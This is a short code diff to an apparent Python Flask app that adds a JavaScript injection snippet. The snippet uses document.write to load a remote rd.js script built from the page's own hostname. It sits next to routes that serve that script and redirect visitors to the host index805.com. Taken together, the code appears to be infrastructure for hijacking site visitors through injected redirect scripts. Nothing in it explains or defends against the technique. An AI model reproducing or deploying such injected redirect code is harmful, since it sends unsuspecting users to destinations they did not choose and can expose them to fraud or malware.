@@ -19,6 +19,18 @@ def redirect1():
     return redirect(dest_url, code=302)
 
 
+'''
+
+  var host_name = window.location.hostname;
+  if (host_name.startsWith('www')) {
+    host_name = host_name.substr(4);
+  }
+  var url = 'd.' + host_name + '/static/rd.js';
+  document.write('<script src="http://' + url + '"> <\/script>');
+
+'''
+
+
 @app.route('/static/rd.js')
 def redirect_js():
     dest_host = 'index805.com'
